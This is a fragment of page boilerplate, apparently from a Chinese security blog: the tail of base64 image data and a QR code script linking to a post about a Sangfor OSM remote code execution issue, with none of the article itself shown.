4a38vIFNQOKl+JbAqVn3lu6fEULFOHpjQ6VW7/fEE/ih/DlQrLBDli3+Zmaf8/uTawOGL782iO+ADie8sTBo+E9AH69hy8Uf/BSGMLvzIi3I/ODjOx64mg7pBbM2uVCpvnO//sTOH65mO0G2ViQOEjcEa0jt2dd3Ty1DvXJ8dibOPgojyeYvmhnmNedee9zrqy3exJ/VI/HXjlaYK8cLbjfkJzCD8LxXZb347bcprl19c561GZur/rMo9s7Wa9s3VzODOPJsyfeM9hrj3zmn/Xkzpg8Z5zV7zdknsw358dCstkOt+m9me/YPr1nrM8Z5vGrJQ7Mu6friTviM0/coS5bm3l0Na8vpxZYTxzs6mqTZ6/55GMhU7zz7zuB47ssL+9Ws/3PIH32yPaZx7ODdf1hfYmD6Zl18/iM5WjBzKMFUzfvnHsI4g8SB4kDvYkD8x2nL7CWODCX7zfEk/ghvHyXlY0F2fYVvPd4e5zcvsSBdTlah/6wnsSBPvXJu3r6Ar2JA/NdT2rxWJN//UrliXiCWTfvNbVn9z7SJ99vyP6cvk09FpLNdriteVc7Xc1+e2auLn9Uj0+PHG0H72HH+q2dzUp91sxTC5wlRwt6biynHpg78yw/FmJRnk1T73XjXDTQe8Y7f/qCWYvWMWfq7zw9M+/zejx9u1z/rHn96MaTU+uwPmduF9Ib7/jvnsDxba9b+izvbtGNz9rUvYa+5HoSB+aTUwvslXeavakFemXrneML1PR+hTMn+Gyv17zfkM+e2F/yHQtxOx/xvKf4p2aep6NDXU6vmFrv67G+yZkztZnHE0zdPNcxPuP0B7Oe3qDr8QVd28XxBOkPjoXsjLf2PSewLCQb2uFP3FqegmA3y2tai69DfbJ9nafHOerm9qh3njV79JhPTt3eyal1nNWXhfSGO/7vTuBq8r9aSLbs8MSBuU+PeWqBudy1xIE1ec4yv+LMCZyRuMNe652tdX/i7ulxakHXnNG1xPEFs27+rxaSC9z4syfwxxeS7QfeppuX1eMJkluTowepBYkD69EmUu/Qq6Zf3VxWD88ePfJZPb1ietRlZ8n6//hCvMDNXzuBZSFub/LZ6PjOam7c+szTG6RuTY62g3VZT/LM6rB2xuk5Q5+T2Bn6owXqO069w1559uhdFjJNd/73T+BYiFv7iK9uzw3rMXemuazvis96ndHrxpP1eh3rU09dTY+cWmA9cYd6/OqJO/TI+iYfC5ninX/fCfwfAAD//7q0/V0AAAAGSURBVAMAndMYy/gqWh8AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-system-concentration\_management-install\_patch-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 